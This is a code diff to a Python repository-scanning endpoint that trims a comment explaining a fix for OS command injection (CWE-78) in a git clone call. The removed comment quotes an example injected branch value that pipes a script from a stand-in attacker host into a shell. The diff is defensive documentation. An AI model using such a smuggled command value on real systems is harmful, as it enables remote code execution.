@@ -252,19 +252,8 @@ async def scan_repository(data: ScanRequest, background_tasks: BackgroundTasks):
         clone_dir = os.path.join("data", "cloned_repos", thread_id[:8])
         os.makedirs(clone_dir, exist_ok=True)
         repo_path = clone_dir
-        # SECURITY FIX: Replaced os.system() shell invocation with subprocess.run().
-        # VULNERABILITY (CWE-78 — OS Command Injection): The original code used:
-        #   os.system(f'git clone --depth 1 -b {data.branch} {data.repo_url} ...')
-        #   User-controlled `data.branch` and `data.repo_url` were embedded in a shell
-        #   string via f-string. An attacker could pass:
-        #     branch = "main; curl attacker.com/shell.sh | sh"
-        #   and the shell would execute the injected command with the bot's privileges.
-        # FIX: subprocess.run() with a list of arguments never invokes a shell.
-        #   Each element is passed as a discrete argument directly to execvp().
-        #   Shell metacharacters (;  &&  |  $()  backticks) in user input are treated
-        #   as literal string characters — no expansion or execution occurs.
-        # WHY SECURE: No shell=True means no /bin/sh is spawned; the kernel receives
-        #   the argument vector directly, so injection is structurally impossible.
+        # Fix (CWE-78): os.system(f-string) allowed shell injection via user-supplied branch/repo_url.
+        # subprocess.run(list) passes args to execvp() directly — no shell spawned, injection impossible.
         try:
             subprocess.run(
                 ["git", "clone", "--depth", "1", "-b", data.branch, data.repo_url, clone_dir],
